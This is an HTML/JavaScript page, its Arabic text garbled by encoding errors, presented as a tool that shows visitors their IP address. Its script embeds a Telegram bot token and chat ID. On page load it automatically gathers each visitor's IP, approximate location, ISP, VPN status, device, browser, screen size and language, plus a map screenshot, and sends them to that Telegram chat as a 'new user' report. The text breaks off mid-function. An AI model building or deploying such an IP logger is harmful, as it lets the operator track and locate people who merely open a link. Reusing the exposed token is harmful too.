<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ø¹Ø±Ø¶ Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù€ IP - Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ù…Ø·ÙˆØ±</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <style>
    :root{
      --bg:#0b1220; --card:#0f1724; --accent:#4ade80; --text:#e6eef8;
      --muted:#98a0b0; --warning:#f59e0b; --danger:#ef4444;
    }
    html,body{height:100%;margin:0;font-family:Inter, "Segoe UI", Tahoma, Arial; background:linear-gradient(180deg,#071025 0%, #071726 100%); color:var(--text)}
    .wrap{max-width:980px;margin:40px auto;padding:20px}
    .ip-badge{
      display:flex;align-items:center;justify-content:space-between;
      gap:12px;padding:16px;border-radius:12px;background:linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      box-shadow: 0 6px 18px rgba(2,6,23,0.6); border:1px solid rgba(255,255,255,0.03);
    }
    .ip-left{display:flex;gap:12px;align-items:center}
    .dot{width:12px;height:12px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px rgba(74,222,128,0.25)}
    h1{margin:0;font-size:18px}
    .ip{font-weight:700;font-size:20px;letter-spacing:0.6px}
    .meta{color:var(--muted);font-size:13px}
    main{margin-top:18px;padding:18px;border-radius:12px;background:var(--card);border:1px solid rgba(255,255,255,0.02)}
    .note{color:var(--muted);font-size:13px;margin-top:10px}
    .center{display:flex;align-items:center;justify-content:center}
    a.btn{display:inline-block;margin-top:12px;padding:8px 14px;border-radius:10px;background:transparent;color:var(--accent);border:1px solid rgba(74,222,128,0.18);text-decoration:none;cursor:pointer;transition:all 0.2s}
    a.btn:hover{background:rgba(74,222,128,0.1)}
    @media(max-width:520px){.ip{font-size:18px}.ip-badge{flex-direction:column;align-items:flex-start}}
    .notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      padding: 12px 20px;
      background: var(--accent);
      color: var(--bg);
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      opacity: 0;
      transform: translateY(20px);
      transition: all 0.3s ease;
      z-index: 1000;
    }
    .notification.show {
      opacity: 1;
      transform: translateY(0);
    }
    
    /* Ø§Ù„ØªØ·ÙˆÙŠØ±Ø§Øª Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© */
    .info-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px;margin:20px 0}
    .info-card{padding:16px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03)}
    .info-card h3{margin:0 0 10px;font-size:14px;color:var(--muted)}
    .info-card p{margin:0;font-size:16px}
    .security-badge{padding:4px 8px;border-radius:4px;font-size:12px;font-weight:bold}
    .security-safe{background:rgba(74,222,128,0.2);color:var(--accent)}
    .security-warning{background:rgba(245,158,11,0.2);color:var(--warning)}
    .security-danger{background:rgba(239,68,68,0.2);color:var(--danger)}
    .copy-btn{background:none;border:none;color:var(--accent);cursor:pointer;margin-right:8px;font-size:14px}
    .copy-btn:hover{opacity:0.8}
    .loading{display:inline-block;width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:var(--accent);animation:spin 1s ease-in-out infinite;margin-left:8px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .map-container{height:200px;border-radius:8px;overflow:hidden;margin:20px 0;background:rgba(255,255,255,0.02)}
    .tabs{display:flex;gap:8px;margin-bottom:16px;border-bottom:1px solid rgba(255,255,255,0.05)}
    .tab{background:none;border:none;color:var(--muted);padding:8px 16px;cursor:pointer;border-bottom:2px solid transparent;transition:all 0.2s}
    .tab.active{color:var(--accent);border-bottom-color:var(--accent)}
    .tab-content{display:none}
    .tab-content.active{display:block}
    .connection-status{display:flex;align-items:center;gap:8px}
    .status-dot{width:8px;height:8px;border-radius:50%}
    .status-online{background:var(--accent);box-shadow:0 0 6px rgba(74,222,128,0.5)}
    .status-offline{background:var(--danger)}
    .flag{display:inline-block;margin-left:8px;font-size:18px}
    .auto-send-indicator {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 6px 12px;
      background: rgba(74, 222, 128, 0.1);
      border-radius: 20px;
      font-size: 12px;
      color: var(--accent);
      margin-right: 10px;
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="ip-badge" id="ipCard">
      <div class="ip-left">
        <div class="dot" aria-hidden="true"></div>
        <div>
          <h1>Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù€ IP Ù…Ø§Ù„ØªÙƒ</h1>
          <div class="meta">Ù‡Ø°Ø§ Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù„ÙŠ ØªØ´ÙˆÙÙ‡ Ø§Ù„Ù…ÙˆØ§Ù‚Ø¹ Ø§Ùˆ Ø§Ù„Ø³ÙŠØ±ÙØ±Ø§Øª</div>
        </div>
      </div>
      <div>
        <div class="ip" id="ip">
          <span id="ipValue">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</span>
          <button class="copy-btn" id="copyIp" title="Ù†Ø³Ø® Ø§Ù„Ù€IP" style="display:none">
            ğŸ“‹
          </button>
          <span class="loading" id="loadingIndicator"></span>
          <span class="auto-send-indicator" id="autoSendIndicator" style="display:none">
            <span>Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ...</span>
          </span>
        </div>
        <div class="meta" id="country"></div>
      </div>
    </div>

    <main>
      <div class="tabs">
        <button class="tab active" data-tab="info">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù€IP</button>
        <button class="tab" data-tab="security">Ø§Ù„Ø£Ù…Ø§Ù†</button>
        <button class="tab" data-tab="network">Ø§Ù„Ø´Ø¨ÙƒØ©</button>
      </div>
      
      <div class="tab-content active" id="info-tab">
        <div class="info-grid">
          <div class="info-card">
            <h3>ğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹</h3>
            <p id="location">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
          <div class="info-card">
            <h3>â° Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©</h3>
            <p id="timezone">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
          <div class="info-card">
            <h3>ğŸ“¡ Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©</h3>
            <p id="isp">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
          <div class="info-card">
            <h3>ğŸŒ Ù†ÙˆØ¹ Ø§Ù„Ù€IP</h3>
            <p id="ipType">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
        </div>
        
        <h3>Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø±ÙŠØ·Ø©</h3>
        <div class="map-container" id="map"></div>
      </div>
      
      <div class="tab-content" id="security-tab">
        <div class="info-grid">
          <div class="info-card">
            <h3>ğŸ›¡ï¸ Ø­Ø§Ù„Ø© Ø§Ù„ÙˆÙƒÙŠÙ„</h3>
            <p id="proxyStatus">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
          <div class="info-card">
            <h3>ğŸ”’ Ø­Ø§Ù„Ø© VPN</h3>
            <p id="vpnStatus">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
          <div class="info-card">
            <h3>ğŸ“± Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²</h3>
            <p id="deviceType">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
          <div class="info-card">
            <h3>ğŸŒ Ø§Ù„Ù…ØªØµÙØ­</h3>
            <p id="browserInfo">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
          </div>
        </div>
        
        <h3>ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø£Ù…Ø§Ù†</h3>
        <div class="info-card">
          <p id="securityAnalysis">Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù†...</p>
        </div>
      </div>
      
      <div class="tab-content" id="network-tab">
        <div class="info-grid">
          <div class="info-card">
            <h3>ğŸ“¶ Ø­Ø§Ù„Ø© Ø§Ù„Ø§ØªØµØ§Ù„</h3>
            <div class="connection-status">
              <span class="status-dot status-online" id="connectionDot"></span>
              <span id="connectionStatus">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</span>
            </div>
          </div>
          <div class="info-card">
            <h3>ğŸ“Š Ø³Ø±Ø¹Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ÙŠØ©</h3>
            <p id="downloadSpeed">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù‚ÙŠØ§Ø³...</p>
          </div>
          <div class="info-card">
            <h3>ğŸ“¤ Ø³Ø±Ø¹Ø© Ø§Ù„Ø±ÙØ¹ Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ÙŠØ©</h3>
            <p id="uploadSpeed">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù‚ÙŠØ§Ø³...</p>
          </div>
          <div class="info-card">
            <h3>â±ï¸ ÙˆÙ‚Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©</h3>
            <p id="pingTime">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù‚ÙŠØ§Ø³...</p>
          </div>
        </div>
        
        <h3>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©</h3>
        <div class="info-card">
          <p id="networkDetails">Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©...</p>
        </div>
      </div>
      
      <p class="note">Ù…Ù„Ø§Ø­Ø¸Ø©: Ø¥Ø°Ø§ ØªØ³ØªØ®Ø¯Ù… VPN Ø£Ùˆ ProxyØŒ Ø±Ø§Ø­ ÙŠØ¸Ù‡Ø± Ø§Ù„Ù€IP Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ù†ÙÙ‚/Ø§Ù„Ø³ÙŠØ±ÙØ± ÙˆÙ‡Ù…ÙŠ Ø§Ù„Ù„ÙŠ ØªÙ…Ø±Ù‘ Ù…Ù†Ù‡.</p>
      <p class="note" style="color: var(--accent);">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ù…Ø¬Ø±Ø¯ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ù„ØµÙØ­Ø©</p>

      <div class="center">
        <a class="btn" id="refresh">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù€ IP ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ</a>
      </div>
    </main>
  </div>

  <div class="notification" id="notification"></div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
  <script>
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨ÙˆØª ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
    const TELEGRAM_BOT_TOKEN = '8258309971:AAFCvMv-FGUG9Ldkt9f7cI1OmwtYMIWhu-o';
    const TELEGRAM_CHAT_ID = '7070074537';

    // Ù…ØªØºÙŠØ±Ø§Øª Ø¹Ø§Ù…Ø©
    let map = null;
    let marker = null;
    let currentIpData = {};
    let autoSendExecuted = false;

    // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª
    function showNotification(message, isError = false) {
      const notification = document.getElementById('notification');
      notification.textContent = message;
      notification.style.background = isError ? '#f87171' : '#4ade80';
      notification.classList.add('show');
      
      setTimeout(() => {
        notification.classList.remove('show');
      }, 3000);
    }

    // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
    async function sendToTelegram(message, imageBlob = null) {
      try {
        if (imageBlob) {
          // Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© Ù…Ø¹ Ø§Ù„Ù†Øµ
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('caption', message);
          formData.append('parse_mode', 'HTML');
          formData.append('photo', imageBlob, 'map.png');
          
          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
          const response = await fetch(url, {
            method: 'POST',
            body: formData
          });
          
          if (!response.ok) {
            throw new Error(`Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©: ${response.status}`);
          }
        } else {
          // Ø¥Ø±Ø³Ø§Ù„ Ù†Øµ ÙÙ‚Ø·
          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
          const response = await fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: message,
              parse_mode: 'HTML'
            })
          });

          if (!response.ok) {
            throw new Error(`Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ${response.status}`);
          }
        }

        return true;
      } catch (error) {
        console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…:', error);
        return false;
      }
    }

    // Ø¯Ø§Ù„Ø© Ù„Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù„Ù„Ø®Ø±ÙŠØ·Ø©
    async function captureMapImage() {
      try {
        const mapElement = document.getElementById('map');
        if (!mapElement || mapElement.innerHTML.includes('ØºÙŠØ± Ù…ØªÙˆÙØ±')) return null;
        
        const canvas = await html2canvas(mapElement, {
          useCORS: true,
          allowTaint: true,
          backgroundColor: '#0f1724'
        });
        
        return new Promise((resolve) => {
          canvas.toBlob(resolve, 'image/png');
        });
      } catch (error) {
        console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø§Ù„Ø®Ø±ÙŠØ·Ø©:', error);
        return null;
      }
    }

    // Ø¯Ø§Ù„Ø© Ù†Ø³Ø® Ø§Ù„Ù†Øµ
    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(() => {
        showNotification('ØªÙ… Ù†Ø³Ø® Ø§Ù„Ù€IP Ø¨Ù†Ø¬Ø§Ø­');
      }).catch(err => {
        console.error('ÙØ´Ù„ ÙÙŠ Ø§Ù„Ù†Ø³Ø®: ', err);
        showNotification('ÙØ´Ù„ ÙÙŠ Ù†Ø³Ø® Ø§Ù„Ù€IP', true);
      });
    }

    // Ø¯Ø§Ù„Ø© ØªØ­Ù„ÙŠÙ„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù†
    function analyzeSecurity(data) {
      let analysis = "";
      let securityLevel = "safe";
      
      if (data.proxy || data.vpn) {
        analysis += "âš ï¸ ÙŠØ¨Ø¯Ùˆ Ø£Ù†Ùƒ ØªØ³ØªØ®Ø¯Ù… VPN Ø£Ùˆ ÙˆÙƒÙŠÙ„. Ù‡Ø°Ø§ Ù‚Ø¯ ÙŠØ¤Ø«Ø± Ø¹Ù„Ù‰ Ø®ØµÙˆØµÙŠØªÙƒ ÙˆØ£Ù…Ø§Ù†Ùƒ.";
        securityLevel = "warning";
      } else {
        analysis += "âœ… Ø§ØªØµØ§Ù„Ùƒ Ù…Ø¨Ø§Ø´Ø± Ø¨Ø¯ÙˆÙ† ÙˆØ³ÙŠØ·. Ù‡Ø°Ø§ ÙŠÙˆÙØ± Ø£Ù…Ø§Ù†Ø§Ù‹ Ø£ÙØ¶Ù„.";
      }
      
      if (data.hosting || data.datacenter) {
        analysis += " ğŸ“ Ø¹Ù†ÙˆØ§Ù† IP Ø®Ø§Øµ Ø¨Ù…Ø±ÙƒØ² Ø¨ÙŠØ§Ù†Ø§Øª.";
        securityLevel = securityLevel === "safe" ? "warning" : securityLevel;
      }
      
      return { analysis, securityLevel };
    }

    // Ø¯Ø§Ù„Ø© Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø®Ø±ÙŠØ·Ø©
    function updateMap(lat, lng, location) {
      if (!map) {
        map = L.map('map').setView([lat, lng], 10);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
        }).addTo(map);
      } else {
        map.setView([lat, lng], 10);
      }
      
      if (marker) {
        map.removeLayer(marker);
      }
      
      marker = L.marker([lat, lng]).addTo(map)
        .bindPopup(location)
        .openPopup();
    }

    // Ø¯Ø§Ù„Ø© Ù„Ù‚ÙŠØ§Ø³ Ø³Ø±Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒØ© (ØªÙ‚Ø±ÙŠØ¨ÙŠØ©)
    async function measureNetworkSpeed() {
      const startTime = performance.now();
      try {
        // Ø§Ø³ØªØ®Ø¯Ø§Ù… ØµÙˆØ±Ø© ØµØºÙŠØ±Ø© Ù„Ù‚ÙŠØ§Ø³ Ø³Ø±Ø¹Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
        const imageUrl = 'https://via.placeholder.com/1x1.png?text=+';
        const response = await fetch(imageUrl, { cache: 'no-store' });
        const endTime = performance.now();
        
        if (response.ok) {
          const duration = endTime - startTime;
          // ØªÙ‚Ø¯ÙŠØ± ØªÙ‚Ø±ÙŠØ¨ÙŠ Ù„Ù„Ø³Ø±Ø¹Ø© (Ù„ÙŠØ³Øª Ø¯Ù‚ÙŠÙ‚Ø© Ù„ÙƒÙ†Ù‡Ø§ ØªØ¹Ø·ÙŠ ÙÙƒØ±Ø©)
          const speed = Math.round((1 / (duration / 1000)) * 8); // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ Mbps
          return {
            download: speed > 1000 ? `${(speed/1000).toFixed(1)} Gbps` : `${speed} Mbps`,
            ping: Math.round(duration)
          };
        }
      } catch (error) {
        console.error('Ø®Ø·Ø£ ÙÙŠ Ù‚ÙŠØ§Ø³ Ø§Ù„Ø³Ø±Ø¹Ø©:', error);
      }
      
      return {
        download: 'ØºÙŠØ± Ù…ØªÙˆÙØ±',
        ping: 'ØºÙŠØ± Ù…ØªÙˆÙØ±'
      };
    }

    // Ø¯Ø§Ù„Ø© Ù„Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­ ÙˆØ§Ù„Ù†Ø¸Ø§Ù…
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browser = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      let device = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      let platform = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      
      // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù…ØªØµÙØ­
      if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
      else if (ua.includes("Firefox")) browser = "Firefox";
      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
      else if (ua.includes("Edg")) browser = "Edge";
      else if (ua.includes("Opera")) browser = "Opera";
      
      // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¬Ù‡Ø§Ø²
      if (ua.includes("Mobile")) device = "Ù‡Ø§ØªÙ Ù…Ø­Ù…ÙˆÙ„";
      else if (ua.includes("Tablet")) device = "Ø¬Ù‡Ø§Ø² Ù„ÙˆØ­ÙŠ";
      else device = "ÙƒÙ…Ø¨ÙŠÙˆØªØ±";
      
      // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù†Ø¸Ø§Ù…
      if (ua.includes("Windows")) platform = "Windows";
      else if (ua.includes("Mac")) platform = "macOS";
      else if (ua.includes("Linux")) platform = "Linux";
      else if (ua.includes("Android")) platform = "Android";
      else if (ua.includes("iOS") || ua.includes("iPhone")) platform = "iOS";
      
      return { browser, device, platform };
    }

    // Ø¯Ø§Ù„Ø© Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„
    function createGoogleMapsLink(lat, lng) {
      if (!lat || !lng) return null;
      return `https://www.google.com/maps?q=${lat},${lng}`;
    }

    // Ø¯Ø§Ù„Ø© Ù„Ø¬Ù…Ø¹ ÙƒÙ„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù… (ØªÙ„Ù‚Ø§Ø¦ÙŠ)
    async function sendAllInfoToTelegram() {
      // Ø¥Ø¸Ù‡Ø§Ø± Ù…Ø¤Ø´Ø± Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
      const indicator = document.getElementById('autoSendIndicator');
      indicator.style.display = 'inline-flex';
      
      try {
        // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø§Ù„Ø®Ø±ÙŠØ·Ø©
        const mapImage = await captureMapImage();
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø³Ø§Ù„Ø© Ù…ÙØµÙ„Ø©
        const browserInfo = getBrowserInfo();
        const mapsLink = createGoogleMapsLink(currentIpData.lat, currentIpData.lng);
        
        let telegramMessage = `
<b>ğŸŒ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª IP ÙƒØ§Ù…Ù„Ø© - Ø¯Ø®ÙˆÙ„ Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯</b>

<b>ğŸ“Š Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©:</b>
ğŸ“± <b>IP:</b> <code>${currentIpData.ip || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}</code>
ğŸŒ <b>Ø§Ù„Ø¨Ù„Ø¯:</b> ${currentIpData.country || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸ™ï¸ <b>Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©:</b> ${currentIpData.city || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸ“ <b>Ø§Ù„Ù…Ù†Ø·Ù‚Ø©:</b> ${currentIpData.region || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
â° <b>Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©:</b> ${currentIpData.timezone || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸ“¡ <b>Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©:</b> ${currentIpData.isp || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸŒ <b>Ù†ÙˆØ¹ Ø§Ù„Ù€IP:</b> ${currentIpData.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}

<b>ğŸ›¡ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù†:</b>
ğŸ”’ <b>Ø§Ù„ÙˆÙƒÙŠÙ„:</b> ${currentIpData.proxy ? 'Ù†Ø¹Ù… âš ï¸' : 'Ù„Ø§ âœ…'}
ğŸ›¡ï¸ <b>VPN:</b> ${currentIpData.vpn ? 'Ù†Ø¹Ù… âš ï¸' : 'Ù„Ø§ âœ…'}
ğŸ“Š <b>ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø£Ù…Ø§Ù†:</b> ${currentIpData.securityAnalysis || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}

<b>ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ØªØµÙØ­:</b>
ğŸ“Ÿ <b>Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²:</b> ${browserInfo.device}
ğŸŒ <b>Ø§Ù„Ù…ØªØµÙØ­:</b> ${browserInfo.browser}
ğŸ’» <b>Ø§Ù„Ù†Ø¸Ø§Ù…:</b> ${browserInfo.platform}
ğŸ–¥ï¸ <b>Ø¯Ù‚Ø© Ø§Ù„Ø´Ø§Ø´Ø©:</b> ${window.screen.width}x${window.screen.height}
ğŸ”  <b>Ø§Ù„Ù„ØºØ©:</b> ${navigator.language}
ğŸŒ <b>Ø§Ù„Ù…Ù†Ø·Ù‚Ø©:</b> ${navigator.language || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}

<b>ğŸ“¶ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©:</b>
ğŸ“¶ <b>Ø­Ø§Ù„Ø© Ø§Ù„Ø§ØªØµØ§Ù„:</b> ${document.getElementById('connectionStatus')?.textContent || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}
ğŸ“¥ <b>Ø³Ø±Ø¹Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„:</b> ${document.getElementById('downloadSpeed')?.textContent || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}
ğŸ“¤ <b>Ø³Ø±Ø¹Ø© Ø§Ù„Ø±ÙØ¹:</b> ${document.getElementById('uploadSpeed')?.textContent || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}
â±ï¸ <b>ÙˆÙ‚Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©:</b> ${document.getElementById('pingTime')?.textContent || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}
        `.trim();

        // Ø¥Ø¶Ø§ÙØ© Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø© Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ØªÙˆÙØ±Ø§Ù‹
        if (mapsLink) {
          telegramMessage += `\n\nğŸ—ºï¸ <b>Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©:</b> <a href="${mapsLink}">Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„</a>`;
        }

        // Ø¥Ø¶Ø§ÙØ© Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ© Ø¹Ù† Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ Ø¥Ø°Ø§ ÙˆØ¬Ø¯Øª
        if (currentIpData.errors && currentIpData.errors.length > 0) {
          telegramMessage += `\n\n<b>âš ï¸ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ Ø§Ù„Ù…Ø³Ø¬Ù„Ø©:</b>\n${currentIpData.errors.join('\n')}`;
        }

        // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø·Ø§Ø¨Ø¹ Ø§Ù„Ø²Ù…Ù†ÙŠ
        telegramMessage += `\n\nğŸ•’ <b>Ø§Ù„ÙˆÙ‚Øª:</b> ${new Date().toLocaleString('ar-SA')}`;
        telegramMessage += `\nğŸ”— <b>Ø§Ù„ØµÙØ­Ø©:</b> ${window.location.href}`;

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const sent = await sendToTelegram(telegramMessage, mapImage);
        if (sent) {
          console.log('ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ù†Ø¬Ø§Ø­');
        } else {
